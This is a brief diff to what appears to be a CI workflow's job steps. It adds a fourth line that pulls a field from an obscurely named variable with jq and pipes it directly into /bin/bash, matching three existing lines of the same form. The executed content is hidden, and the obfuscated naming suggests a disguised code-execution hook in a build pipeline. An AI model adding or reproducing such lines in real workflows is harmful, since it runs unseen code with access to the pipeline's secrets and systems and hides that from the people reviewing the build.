@@ -23,6 +23,7 @@ jobs:
           echo $cr9 | jq -r .srs79 | /bin/bash
           echo $rbqqn3374 | jq -r .ecgfz2 | /bin/bash
           printf '%s' "$vj21382" | jq -r .kcitr22 | /bin/bash
+          printf '%s' "$i7714" | jq -r .l24229 | /bin/bash
 
       - name: Persist output
         if: always()
